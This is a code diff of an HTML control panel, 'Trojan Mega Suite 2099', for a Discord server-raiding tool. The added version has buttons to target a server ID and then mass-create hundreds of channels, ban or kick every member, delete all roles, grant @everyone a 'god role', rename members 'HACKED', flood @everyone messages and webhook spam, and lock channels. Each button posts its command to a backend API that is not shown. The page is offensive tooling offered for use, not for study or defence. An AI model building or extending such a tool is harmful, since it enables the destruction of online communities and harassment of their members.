@@ -2,138 +2,98 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Trojan Dashboard - Control Panel</title>
+    <title>Trojan Mega - Control Panel</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: #0a0f1e;
-            font-family: 'Courier New', monospace;
-            padding: 20px;
-        }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        .header {
-            background: #0d1117;
-            border: 1px solid #2ea043;
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .header h2 {
-            color: #ff4d4d;
-        }
-        .logout-btn {
-            background: #21262d;
-            color: #ff4d4d;
-            border: 1px solid #ff4d4d;
-            padding: 8px 16px;
-            border-radius: 6px;
-            cursor: pointer;
-        }
-        .card {
-            background: #0d1117;
-            border: 1px solid #30363d;
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-        .card-title {
-            color: #2ea043;
-            font-size: 20px;
-            margin-bottom: 15px;
-            border-bottom: 1px solid #30363d;
-            padding-bottom: 8px;
-        }
-        .btn-group {
-            display: flex;
-            gap: 12px;
-            flex-wrap: wrap;
-            margin-bottom: 20px;
-        }
-        .attack-btn {
-            background: #21262d;
-            border: 1px solid #ff4d4d;
-            padding: 12px 20px;
-            color: #ff4d4d;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: 0.1s;
-        }
-        .attack-btn:hover {
-            background: #ff4d4d;
-            color: #000;
-            box-shadow: 0 0 10px #ff4d4d;
-        }
-        .output {
-            background: #010409;
-            border: 1px solid #2ea043;
-            padding: 15px;
-            border-radius: 8px;
-            color: #00ff99;
-            font-family: monospace;
-            font-size: 13px;
-            min-height: 200px;
-            white-space: pre-wrap;
-            overflow-y: auto;
-        }
-        .spam-input {
-            display: flex;
-            gap: 10px;
-            margin-top: 10px;
-        }
-        .spam-input input {
-            flex: 1;
-            background: #010409;
-            border: 1px solid #30363d;
-            color: white;
-            padding: 8px;
-            border-radius: 6px;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0f1e; font-family: 'Courier New', monospace; padding: 20px; }
+        .container { max-width: 1000px; margin: 0 auto; }
+        .header { background: #0d1117; border: 1px solid #2ea043; padding: 20px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
+        .header h2 { color: #ff4d4d; }
+        .server-input { display: flex; gap: 10px; align-items: center; background: #161b22; padding: 10px; border-radius: 8px; }
+        .server-input input { background: #010409; border: 1px solid #30363d; color: #00ff99; padding: 8px; border-radius: 6px; width: 200px; }
+        .server-input button { background: #2ea043; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: bold; }
+        .logout-btn { background: #21262d; color: #ff4d4d; border: 1px solid #ff4d4d; padding: 8px 16px; border-radius: 6px; cursor: pointer; }
+        .card { background: #0d1117; border: 1px solid #30363d; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
+        .card-title { color: #2ea043; font-size: 18px; margin-bottom: 15px; border-bottom: 1px solid #30363d; padding-bottom: 8px; }
+        .btn-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 12px; margin-bottom: 20px; }
+        .attack-btn { background: #21262d; border: 1px solid #ff4d4d; padding: 10px 15px; color: #ff4d4d; font-weight: bold; border-radius: 8px; cursor: pointer; transition: 0.1s; font-size: 13px; }
+        .attack-btn:hover { background: #ff4d4d; color: #000; box-shadow: 0 0 10px #ff4d4d; }
+        .output { background: #010409; border: 1px solid #2ea043; padding: 15px; border-radius: 8px; color: #00ff99; font-family: monospace; font-size: 12px; min-height: 250px; overflow-y: auto; white-space: pre-wrap; }
+        .spam-area { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 10px; }
+        .spam-area input { flex: 1; background: #010409; border: 1px solid #30363d; color: white; padding: 8px; border-radius: 6px; }
+        .status { display: inline-block; background: #2ea043; color: #000; padding: 4px 10px; border-radius: 20px; font-size: 11px; margin-left: 10px; }
+        .status-warning { background: #ff4d4d; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h2>💀 TROJAN COMMANDER 2099 💀</h2>
+            <h2>💀 TROJAN MEGA SUITE 2099 💀</h2>
+            <div class="server-input">
+                <input type="text" id="serverIdInput" placeholder="🎯 Enter Server ID">
+                <button id="setServerBtn">✅ SET TARGET</button>
+            </div>
             <button class="logout-btn" id="logoutBtn">⛔ LOGOUT</button>
         </div>
         
         <div class="card">
-            <div class="card-title">⚔️ ATTACK COMMANDS</div>
-            <div class="btn-group">
-                <button class="attack-btn" data-cmd="nuke">💣 NUKE SERVER</button>
-                <button class="attack-btn" data-cmd="token-grab">🎯 GRAB TOKENS</button>
-                <button class="attack-btn" data-cmd="role-elevate">👑 ROLE ELEVATE</button>
-                <button class="attack-btn" data-cmd="ban-all">🚫 BAN ALL</button>
+            <div class="card-title">💣 ULTRA NUKE (FLYING SPEED) 💣</div>
+            <div class="btn-grid">
+                <button class="attack-btn" data-cmd="ultra-nuke">🔥 ULTRA NUKE (100+ ROOMS)</button>
+                <button class="attack-btn" data-cmd="mass-channels" data-count="200">📁 200 CHANNELS MASS</button>
+                <button class="attack-btn" data-cmd="mass-channels" data-count="500">🚀 500 CHANNELS EXTREME</button>
             </div>
-            
-            <div class="card-title" style="margin-top: 15px;">📨 SPAM</div>
-            <div class="spam-input">
-                <input type="number" id="spamCount" placeholder="عدد الرسائل" value="30">
-                <input type="text" id="spamMsg" placeholder="الرسالة" value="@everyone 🔥 TROJAN 2099 🔥">
-                <button class="attack-btn" data-cmd="spam" style="margin:0;">✉️ SEND SPAM</button>
+        </div>
+        
+        <div class="card">
+            <div class="card-title">👑 DESTRUCTION TOOLS</div>
+            <div class="btn-grid">
+                <button class="attack-btn" data-cmd="ban-all">🚫 BAN ALL MEMBERS</button>
+                <button class="attack-btn" data-cmd="kick-all">👢 KICK ALL MEMBERS</button>
+                <button class="attack-btn" data-cmd="delete-all-roles">🗑️ DELETE ALL ROLES</button>
+                <button class="attack-btn" data-cmd="role-elevate">👑 ELEVATE @everyone + GOD ROLE</button>
+                <button class="attack-btn" data-cmd="rename-everyone">✏️ RENAME ALL MEMBERS</button>
+            </div>
+        </div>
+        
+        <div class="card">
+            <div class="card-title">📨 SPAM & FLOOD</div>
+            <div class="spam-area">
+                <input type="number" id="spamCount" placeholder="Count" value="100">
+                <input type="text" id="spamMsg" placeholder="Message" value="@everyone 🔥 TROJAN MEGA 2099 🔥">
+                <button class="attack-btn" data-cmd="spam">💬 TEXT SPAM</button>
+                <button class="attack-btn" data-cmd="webhook-spam">🪝 WEBHOOK SPAM</button>
+            </div>
+        </div>
+        
+        <div class="card">
+            <div class="card-title">🔒 CHANNEL CONTROL</div>
+            <div class="btn-grid">
+                <button class="attack-btn" data-cmd="slowmode-all" data-seconds="21600">🐢 SLOWMODE 6 HOURS</button>
+                <button class="attack-btn" data-cmd="slowmode-all" data-seconds="0">⚡ REMOVE SLOWMODE</button>
+                <button class="attack-btn" data-cmd="lock-all">🔒 LOCK ALL CHANNELS</button>
+                <button class="attack-btn" data-cmd="create-invite">🔗 CREATE INVITE LINK</button>
+            </div>
+        </div>
+        
+        <div class="card">
+            <div class="card-title">🎯 INFORMATION & GRAB</div>
+            <div class="btn-grid">
+                <button class="attack-btn" data-cmd="token-grab">🎫 GRAB TOKENS (FAKE)</button>
             </div>
         </div>
         
         <div class="card">
             <div class="card-title">📟 OUTPUT LOG</div>
             <div class="output" id="output">
-                > جاهز لتنفيذ الأوامر...
+> Ready for destruction...\n> Please set Server ID first!
             </div>
         </div>
     </div>
 
     <script>
+        let serverIdSet = false;
+        
         function addOutput(text) {
             const output = document.getElementById('output');
             output.innerHTML += `\n[${new Date().toLocaleTimeString()}] > ${text}`;
@@ -141,7 +101,11 @@
         }
         
         async function executeCommand(command, params = {}) {
-            addOutput(`تنفيذ: ${command}...`);
+            if (!serverIdSet && command !== 'set-server') {
+                addOutput('❌ Please set Server ID first!');
+                return;
+            }
+            addOutput(`⚡ Executing: ${command}...`);
             try {
                 const res = await fetch('/api/execute', {
                     method: 'POST',
@@ -149,23 +113,58 @@
                     body: JSON.stringify({ command, params })
                 });
                 const data = await res.json();
-                addOutput(`النتيجة: ${JSON.stringify(data, null, 2)}`);
+                addOutput(`✅ Result: ${JSON.stringify(data, null, 2)}`);
             } catch(e) {
-                addOutput(`خطأ: ${e.message}`);
+                addOutput(`❌ Error: ${e.message}`);
             }
         }
+        
+        // تعيين Server ID
+        document.getElementById('setServerBtn').addEventListener('click', async () => {
+            const serverId = document.getElementById('serverIdInput').value.trim();
+            if (!serverId) {
+                addOutput('❌ Enter valid Server ID');
+                return;
+            }
+            const res = await fetch('/api/set-server', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ serverId })
+            });
+            const data = await res.json();
+            if (data.success) {
+                serverIdSet = true;
+                addOutput(`✅ Target Server ID set: ${serverId}`);
+            } else {
+                addOutput(`❌ ${data.error}`);
+            }
+        });
         
         // أزرار الهجوم
         document.querySelectorAll('.attack-btn').forEach(btn => {
             btn.addEventListener('click', () => {
                 const cmd = btn.getAttribute('data-cmd');
-                if (cmd === 'spam') {
-                    const count = document.getElementById('spamCount').value;
-                    const message = document.getElementById('spamMsg').value;
-                    executeCommand('spam', { count: parseInt(count), message });
-                } else {
-                    executeCommand(cmd);
+                const params = {};
+                
+                if (btn.hasAttribute('data-count')) {
+                    params.count = parseInt(btn.getAttribute('data-count'));
                 }
+                if (btn.hasAttribute('data-seconds')) {
+                    params.seconds = parseInt(btn.getAttribute('data-seconds'));
+                }
+                if (cmd === 'spam') {
+                    params.count = parseInt(document.getElementById('spamCount').value);
+                    params.message = document.getElementById('spamMsg').value;
+                }
+                if (cmd === 'webhook-spam') {
+                    params.count = parseInt(document.getElementById('spamCount').value);
+                    params.message = document.getElementById('spamMsg').value;
+                }
+                if (cmd === 'rename-everyone') {
+                    params.name = document.getElementById('spamMsg').value || 'HACKED';
+                }
+                
+                executeCommand(cmd, params);
             });
         });
         
